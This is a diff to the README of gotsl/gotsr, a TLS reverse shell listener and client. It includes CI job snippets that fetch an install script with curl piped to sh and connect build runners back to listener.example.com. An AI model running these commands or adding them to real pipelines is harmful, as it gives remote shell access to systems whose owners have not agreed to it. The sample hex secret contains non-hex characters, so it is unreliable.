@@ -28,14 +28,25 @@ Use this when you need a self-hosted, encrypted reverse shell alternative—for 
 ### Basic Usage
 - Start gotsl (Listener, TLS, self-signed):
   ```bash
-  ./gotsl <port> <bind-ip>
+  ./gotsl --port 9001 --interface 0.0.0.0
   ```
+  Available flags:
+  - `--port PORT` (required): Port to listen on
+  - `--interface INTERFACE` (required): Network interface to bind to
+  - `-s, --shared-secret` (optional): Enable shared secret authentication
+
 - Start gotsr (Reverse shell client):
   ```bash
-  ./gotsr <host:port> <max-retries>
+  ./gotsr --target listener.example.com:9001 --retries 5
   ```
-- Core gotsl commands: `list`, `shell <client_id>`, `exit`.
-- In a session: run shell commands; `Ctrl D` to return.
+  Available flags:
+  - `--target HOST:PORT` (required): Target server address
+  - `--retries NUM` (required): Maximum retries (0 = infinite)
+  - `-s, --shared-secret SECRET` (optional): Shared secret for authentication
+  - `--cert-fingerprint FINGERPRINT` (optional): Server certificate SHA256 fingerprint
+
+- Core gotsl commands: `ls`, `shell <client_id>`, `upload`, `download`, `help`, `exit`.
+- In a shell session: run shell commands; `Ctrl-D` to return, `Ctrl-C` for interrupt.
 
 **Quick tips:**
 First connection without a fingerprint will still work with a self-signed cert; the client (`gotsr`) logs a warning and prints the certificate fingerprint. If you use pinning, obtain and verify the fingerprint via a trusted channel (e.g., printed by `gotsl`) before using `--cert-fingerprint`.
@@ -46,20 +57,20 @@ For additional security, use a shared secret handshake between listener and clie
 
 1. Start `gotsl` with `-s` flag to auto-generate a secret:
    ```bash
-   ./gotsl -s <port> <bind-ip>
+   ./gotsl -s --port 9001 --interface 0.0.0.0
    ```
-   This prints the full gotsr command with the hex-encoded secret and certificate fingerprint. You might need to adapt the IP address:
+   This prints the full gotsr command with the hex-encoded secret and certificate fingerprint:
    ```
    ✓ Shared secret authentication enabled
    Secret (hex): 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i
    
    To connect, use:
-   ./gotsr -s 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i --cert-fingerprint 686033a3b9db41c3877e484f4df210ac98bff296da9d6f99ef36f1394c1946ee 127.0.0.1:8443 1
+   ./gotsr -s 47e5e491ed1308f0fe4f83520fddb8f45cf3c1094f4e1d387cdb0e99b6c3f426a1b2c3d4e5f6g7h8i --cert-fingerprint 686033a3b9db41c3877e484f4df210ac98bff296da9d6f99ef36f1394c1946ee --target 127.0.0.1:8443 --retries 1
    ```
 
 2. Start `gotsr` with the hex-encoded secret and fingerprint:
    ```bash
-   ./gotsr -s <hex-secret> --cert-fingerprint <fingerprint> <host:port> <max-retries>
+   ./gotsr -s <hex-secret> --cert-fingerprint <fingerprint> --target <host:port> --retries <num>
    ```
 
 The listener will log a warning if the client fails to authenticate with the correct secret.
@@ -95,7 +106,7 @@ GitLab CI (`.gitlab-ci.yml`):
     script:
       - apk add --no-cache curl
       - curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
-      - ~/.local/bin/gotsr listener.example.com:8443 3
+      - ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
   ```
 
 GitLab CI (Windows runner, PowerShell):
@@ -120,7 +131,7 @@ GitHub Actions:
         - name: Install gotsr client
           run: curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
         - name: Run gotsr
-          run: ~/.local/bin/gotsr listener.example.com:8443 3
+          run: ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
   ```
 
 GitHub Actions (Windows, PowerShell):
@@ -138,5 +149,5 @@ GitHub Actions (Windows, PowerShell):
         - name: Run gotsr (PowerShell)
           shell: pwsh
           run: |
-            & "$HOME/.local/bin/gotsr" listener.example.com:8443 3
+            & "$HOME/.local/bin/gotsr" --target listener.example.com:9001 --retries 3
   ```
